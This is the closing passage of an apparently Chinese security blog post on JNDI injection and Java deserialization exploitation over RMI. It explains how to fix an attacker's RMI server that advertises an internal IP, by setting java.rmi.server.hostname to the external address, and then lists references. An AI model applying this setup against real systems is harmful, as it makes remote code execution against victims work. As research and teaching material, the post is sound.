<p><img src="https://kingx.me/images/articles/rmi/127.0.0.1.png" alt="KaliHosts" />
注：攻击者RMI服务端向目标发送远程对象的定位信息</p>

<p><img src="https://kingx.me/images/articles/rmi/client-通信请求.png" alt="KaliHosts" />
注：目标向攻击者的远程对象发起请求</p>

<p>定位到问题解决起来就简单了。可以把/etc/hosts中指向内网IP的记录删除或者指向外网IP，也可以在攻击者的RMI服务端通过代码明确指定远程对象通信Host IP：</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>System.setProperty("java.rmi.server.hostname","外网IP");
</code></pre></div></div>

<p>或者在启动RMI服务时，通过启动参数指定 java.rmi.server.hostname 属性：</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>-Djava.rmi.server.hostname=服务器真实外网IP
</code></pre></div></div>

<h1 id="4-references">4. References</h1>

<ol>
  <li><a href="https://docs.oracle.com/javase/8/docs/technotes/guides/jndi/jndi-rmi.html">https://docs.oracle.com/javase/8/docs/technotes/guides/jndi/jndi-rmi.html</a></li>
  <li><a href="https://docs.oracle.com/javase/jndi/tutorial/objects/storing/remote.html">https://docs.oracle.com/javase/jndi/tutorial/objects/storing/remote.html</a></li>
  <li><a href="https://docs.oracle.com/javase/jndi/tutorial/objects/reading/lookup.html">https://docs.oracle.com/javase/jndi/tutorial/objects/reading/lookup.html</a></li>
  <li><a href="https://docs.oracle.com/javase/jndi/tutorial/objects/storing/reference.html">https://docs.oracle.com/javase/jndi/tutorial/objects/storing/reference.html</a></li>
  <li><a href="https://docs.oracle.com/javase/tutorial/rmi/overview.html">https://docs.oracle.com/javase/tutorial/rmi/overview.html</a></li>
  <li><a href="https://www.slideshare.net/codewhitesec/java-deserialization-vulnerabilities-the-forgotten-bug-class">https://www.slideshare.net/codewhitesec/java-deserialization-vulnerabilities-the-forgotten-bug-class</a></li>
  <li><a href="https://kingx.me/Exploit-Java-Deserialization-with-RMI.html">https://kingx.me/Exploit-Java-Deserialization-with-RMI.html</a></li>
  <li><a href="https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE-wp.pdf">https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE-wp.pdf</a></li>
  <li><a href="https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf">https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf</a></li>
</ol>


      <footer class="entry-meta">
        <span class="entry-tags" style="color:black;font-size:13px;margin-bottom: 0px;">欢迎订阅我的微信公众号</span>
        <img src="/images/secengine.jpg" alt="welcome subscribe"/>
        <span class="entry-tags"><a href="https://kingx.me/tags/#Vulnerability" title="Pages tagged Vulnerability" class="tag"><span class="term">Vulnerability</span></a><a href="https://kingx.me/tags/#Java" title="Pages tagged Java" class="tag"><span class="term">Java</span></a></span>
        
        <div class="social-share">
  <ul class="socialcount socialcount-small inline-list">
    <li class="weibo"><a href="http://service.weibo.com/share/share.php?title=分享KINGX的文章《深入理解JNDI注入与Java反序列化漏洞利用》&url=https://kingx.me/Exploit-Java-Deserialization-with-RMI.html&source=bookmark" title="Share on Weibo" target="_blank"><span class="count"><i class="fa fa-weibo"></i> WEIBO</span></a></li>
    <li class="facebook"><a href="https://www.facebook.com/sharer/sharer.php?u=https://kingx.me/Exploit-Java-Deserialization-with-RMI.html" title="Share on Facebook"><span class="count"><i class="fa fa-facebook-square"></i> Like</span></a></li>
    <li class="twitter"><a href="https://twitter.com/intent/tweet?text=https://kingx.me/Exploit-Java-Deserialization-with-RMI.html" title="Share on Twitter"><span class="count"><i class="fa fa-twitter-square"></i> Tweet</span></a></li>
    <li class="googleplus"><a href="https://plus.google.com/share?url=https://kingx.me/Exploit-Java-Deserialization-with-RMI.html" title="Share on Google Plus"><span class="count"><i class="fa fa-google-plus-square"></i> +1</span></a></li>
  </ul>
</div><!-- /.social-share -->
<!--
<div class="ds-share" data-thread-key="/Exploit-Java-Deserialization-with-RMI" data-title="深入理解JNDI注入与Java反序列化漏洞利用" data-images="" data-content="深入理解JNDI注入与Java反序列化漏洞利用" data-url="https://kingx.me/Exploit-Java-Deserialization-with-RMI.html">
    <div class="ds-share-inline">
      <ul  class="ds-share-icons-16">
        <li data-toggle="ds-share-icons-more"><a class="ds-more" href="javascript:void(0);">分享到：</a></li>
        <li><a class="ds-weibo" href="javascript:void(0);" data-service="weibo">微博</a></li>
        <li><a class="ds-qzone" href="javascript:void(0);" data-service="qzone">QQ空间</a></li>
        <li><a class="ds-qqt" href="javascript:void(0);" data-service="qqt">腾讯微博</a></li>
        <li><a class="ds-wechat" href="javascript:void(0);" data-service="wechat">微信</a></li>
      </ul>
      <div class="ds-share-icons-more">
      </div>
    </div>
</div>
-->
      </footer>
    </div><!-- /.entry-content -->
    
    

    <div class="read-more">
  
    <div class="read-more-header">
      
        <a href="https://kingx.me/Details-in-FastJson-RCE.html" class="read-more-btn">Read More</a>
      
    </div><!-- /.read-more-header -->
    <div class="read-more-content">
      
      <h3><a href="https://kingx.me/Restrictions-and-Bypass-of-JNDI-Manipulations-RCE.html" title="如何绕过高版本JDK的限制进行JNDI注入利用">如何绕过高版本JDK的限制进行JNDI注入利用</a></h3>
      <p>Restrictions of JNDI Manipulation RCE & Bypass <a href="https://kingx.me/Restrictions-and-Bypass-of-JNDI-Manipulations-RCE.html">Continue reading</a></p>
      
    </div><!-- /.read-more-content -->
  
  <div class="read-more-list">
    
      
      <div class="list-item">
        <h4><a href="https://kingx.me/Thinking-about-Red-Teaming.html" title="【红蓝对抗】大型互联网企业安全蓝军建设">【红蓝对抗】大型互联网企业安全蓝军建设</a></h4>
        <span>Published on March 12, 2019</span>
      </div><!-- /.list-item -->
      
    
      
      <div class="list-item">
        <h4><a href="https://kingx.me/CobaltStrike-Patch.html" title="内网渗透有它就够了，手把手教你分析CobaltStrike3.12">内网渗透有它就够了，手把手教你分析CobaltStrike3.12</a></h4>
        <span>Published on November 19, 2018</span>
      </div><!-- /.list-item -->
      
    
  </div><!-- /.read-more-list -->
</div><!-- /.read-more -->
  </article>
</div><!-- /#main -->

<div class="footer-wrapper">
  <footer role="contentinfo">
    <span>&copy; 2019 KINGX. Powered by Jekyll using the HPSTR Theme.</span>
  </footer>
</div><!-- /.footer-wrapper -->

<!--<script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>-->
<!-- <script src="http://libs.baidu.com/jquery/1.9.1/jquery.min.js"></script> -->
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
<script>window.jQuery || document.write('<script src="https://kingx.me/assets/js/vendor/jquery-1.9.1.min.js"><\/script>')</script>
<script src="https://kingx.me/assets/js/scripts.min.js"></script>




<script>

var _hmt = _hmt || [];
(function() {
  var hm = document.createElement("script");
  if(location.host=="kingx.me"){
    hm.src = "https://hm.baidu.com/hm.js?d11d8512e0bc6992b9c9bbf2d266ce31";
  }else if(location.host=="kingx.sinaapp.com"){
    hm.src = "https://hm.baidu.com/hm.js?d1b3dbd97b73868454f102755fdf51ba";
  }
  var s = document.getElementsByTagName("script")[0]; 
  s.parentNode.insertBefore(hm, s);
})();
</script>



<!-- Busuanzi Analytics -->
<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>



	        

</body>
</html>
